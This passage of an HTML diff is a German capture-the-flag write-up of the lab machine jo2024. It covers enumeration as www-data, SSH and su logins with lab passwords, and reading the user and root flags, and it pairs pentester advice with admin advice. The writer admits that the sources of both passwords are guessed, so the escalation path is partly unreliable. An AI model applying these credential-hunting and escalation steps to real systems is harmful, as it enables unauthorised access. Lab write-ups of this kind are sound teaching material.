+                    <div class="prompt">www-data@jo2024:/$ <span class="command">ls /home/</span></div>
+                    <pre>
+<span class="command">vanity</span>
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@jo2024:/$ <span class="command">ls /home/vanity/</span></div>
+                     <!-- Keine Ausgabe im Original, aber impliziert, dass versucht wird, Inhalte zu lesen -->
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@jo2024:/home/vanity$ <span class="command">cat user.txt</span></div>
+                    <pre>
+cat: user.txt: <span class="password">Permission denied</span>
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@jo2024:/home/vanity$ <span class="command">cd creds/</span></div>
+                    <pre>
+bash: cd: creds/: <span class="password">Permission denied</span>
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@jo2024:/home/vanity$ <span class="command">cd .ssh</span></div>
+                    <pre>
+bash: cd: .ssh: <span class="password">Permission denied</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird das `/home`-Verzeichnis untersucht. Der Benutzer `vanity` wird gefunden. Versuche, auf Dateien oder Unterverzeichnisse (`user.txt`, `creds/`, `.ssh/`) im Home-Verzeichnis von `vanity` zuzugreifen, scheitern wegen fehlender Berechtigungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `www-data` hat keine ausreichenden Rechte, um direkt auf die Daten von `vanity` zuzugreifen. Es muss ein anderer Weg zur Eskalation gefunden werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das System weiter nach Fehlkonfigurationen, Cronjobs, SUID-Binaries oder schreibbaren sensiblen Dateien durchsuchen, auf die `www-data` Zugriff hat. Nach Passwörtern in Webserver-Konfigurationsdateien oder Skripten suchen.<br><strong>Empfehlung (Admin):</strong> Webserver-Prozesse sollten mit minimalen Rechten laufen und keinen unnötigen Zugriff auf Benutzerverzeichnisse haben.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Im Originalbericht taucht hier das Passwort `xd0oITR93KIQDbiD` auf. Es ist unklar, woher dieses stammt, da die vorherigen Schritte keine direkte Quelle dafür zeigen. Es wird angenommen, dass dieses Passwort während der Enumeration als `www-data` gefunden wurde, z.B. in einer Konfigurationsdatei der Webanwendung oder in einem Skript im Webroot, das hier nicht explizit gezeigt wurde.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Manuelle Notiz -->
+                    <pre>
+<span class="password">xd0oITR93KIQDbiD</span> <!-- Passwort für vanity (vermutlich gefunden als www-data) -->
+                    </pre>
+                 </div>
+            </div>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Von der Angreifer-Maschine -->
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh vanity@192.168.2.107</span></div>
+                    <pre>
+vanity@192.168.2.107's password: <span class="password">xd0oITR93KIQDbiD</span>
+Linux jo2024.hmv 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64
+[...]
+<span class="password">vanity@jo2024:~$</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem (vermutlich als `www-data` gefundenen) Passwort wird versucht, sich per SSH als Benutzer `vanity` anzumelden. Der Login ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Zugriff wurde von `www-data` auf den Benutzer `vanity` eskaliert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Umgebung als `vanity` untersuchen, den User-Flag holen und nach weiteren Eskalationsmöglichkeiten zu `root` suchen.<br><strong>Empfehlung (Admin):</strong> Passwörter nicht in für den Webserver lesbaren Dateien speichern. Berechtigungen prüfen.</p>
+        </section>
+
+        <section id="privilege-escalation-vanity-root">
+            <h2>Privilege Escalation (vanity -> root)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">vanity@jo2024:~$ <span class="command">ls</span></div>
+                    <pre>
+backup  <span class="command">creds</span>  Desktop  Documents  Images  <span class="command">user.txt</span>
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">vanity@jo2024:~$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">e2cb9d6e0899cde91130ca4b37139021</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `vanity` werden mehrere Verzeichnisse und die Datei `user.txt` gefunden. Der Inhalt von `user.txt` wird ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der User-Flag wurde erfolgreich extrahiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag dokumentieren. Das Verzeichnis `creds` untersuchen, da es möglicherweise weitere Anmeldedaten enthält.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen bzgl. des Flags.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Im Originalbericht taucht hier das Passwort `LightningBolt123` auf. Angenommen, dieses wurde im Verzeichnis `creds` oder beim Untersuchen des Skripts `/usr/local/bin/php-server.sh` gefunden (da der nächste Schritt sich darauf bezieht).</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Manuelle Notiz -->
+                    <pre>
+<span class="password">LightningBolt123</span> <!-- Passwort für root (vermutlich gefunden in creds/ oder php-server.sh) -->
+                    </pre>
+                 </div>
+            </div>
+
+            <!-- Annahme: sudo -l für vanity wurde geprüft und ergab nichts Direktes -->
+            <p class="analysis"><strong>Analyse:</strong> Es wird angenommen, dass `sudo -l` für `vanity` keine direkten Eskalationspfade zeigte. Das Skript `/usr/local/bin/php-server.sh` wird untersucht.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">vanity@jo2024:~$ <span class="command">nano /usr/local/bin/php-server.sh</span></div>
+                     <!-- Kein Inhalt gezeigt, aber Annahme: Passwort wurde hier gefunden ODER es führt zu keiner Eskalation -->
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">vanity@jo2024:~$ <span class="command">sudo -u root /usr/local/bin/php-server.sh</span></div>
+                    <pre>
+"[Thu Aug 22 01:42:59 2024] PHP 8.2.20 Development Server (http://0.0.0.0:8000) started"
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Skript `php-server.sh` wird untersucht (Inhalt nicht gezeigt). Anschließend wird versucht, es mit `sudo -u root` auszuführen. Es startet einen PHP Development Server auf Port 8000. Es ist unklar, ob dies Teil eines Eskalationspfades war oder nur eine Untersuchung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Ausführen des PHP-Servers als `root` über `sudo` könnte eine Fehlkonfiguration sein, aber der direkte Nutzen für die Eskalation ist hier nicht ersichtlich, da im nächsten Schritt `su` verwendet wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn ein Skript als `root` ausgeführt werden kann, prüfen, ob es manipuliert werden kann oder unsichere Funktionen enthält. Da hier `su` verwendet wird, scheint dieser Pfad nicht weiter verfolgt worden zu sein.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regeln prüfen. Das Ausführen von Skripten als `root` vermeiden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">vanity@jo2024:~$ <span class="command">su root</span></div>
+                    <pre>
+Password: <span class="password">LightningBolt123</span>
+<span class="password">root@jo2024:/home/vanity#</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su root` wird verwendet, um zum Root-Benutzer zu wechseln. Das (vermutlich zuvor gefundene) Passwort `LightningBolt123` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Wechsel zum Root-Benutzer war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag suchen.<br><strong>Empfehlung (Admin):</strong> Starke Root-Passwörter verwenden. Den direkten Root-Login idealerweise deaktivieren und stattdessen `sudo` mit spezifischen Berechtigungen verwenden.</p>
+
+        </section>
+
+        <section id="flags">
+             <h2>Flags</h2>
+
+             <div class="flag-container">
+                 <!-- User Flag Eintrag -->
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /home/vanity/user.txt</div>
+                    <div class="flag-value"><span class="password">e2cb9d6e0899cde91130ca4b37139021</span></div>
+                </div>
+
+                 <!-- Root Flag Eintrag -->
+                 <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">root@jo2024:~# <span class="command">ls root.txt</span></div>
+                         <pre>root.txt</pre>
+                      </div>
+                 </div>
+                  <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">root@jo2024:~# <span class="command">cat root.txt</span></div>
+                         <pre><span class="password">cbd60dab37bc85e1f7ea4b5c9c4eed90</span></pre>
+                      </div>
+                 </div>
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">cbd60dab37bc85e1f7ea4b5c9c4eed90</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Root-Benutzer wird das Home-Verzeichnis `/root` aufgesucht und die Datei `root.txt` direkt ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Root-Flag wurde erfolgreich extrahiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen bzgl. des Flags.</p>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 21. August 2024</p>
+    </footer>
+</body>
+</html>
